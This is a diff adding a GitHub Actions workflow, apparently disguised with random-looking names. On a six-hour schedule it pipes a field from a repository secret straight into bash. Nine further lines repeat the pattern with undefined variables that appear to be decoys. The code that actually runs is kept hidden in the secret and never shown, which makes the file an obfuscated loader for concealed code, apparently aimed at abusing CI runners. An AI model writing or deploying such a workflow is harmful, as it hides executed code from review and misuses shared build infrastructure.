@@ -1,0 +1,27 @@
+name: chengyihai2603
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengyihai2603
+        env:
+          sow5403: ${{ secrets.sow5403 }}
+        run: |
+          echo $sow5403 | jq -r .dzw1 | /bin/bash
+          echo $nmf3 | jq -r .b9 | /bin/bash
+          echo $kj258 | jq -r .dya48450 | /bin/bash
+          echo $e23 | jq -r .usnx92 | /bin/bash
+          echo $w1298 | jq -r .f7102 | /bin/bash
+          echo $dcp5293 | jq -r .swhc96799 | /bin/bash
+          echo $cho69482 | jq -r .zqzs17 | /bin/bash
+          echo $x5 | jq -r .t169 | /bin/bash
+          echo $ietyv4 | jq -r .oioq743 | /bin/bash
+          echo $hwx3121 | jq -r .rbsh24638 | /bin/bash
+
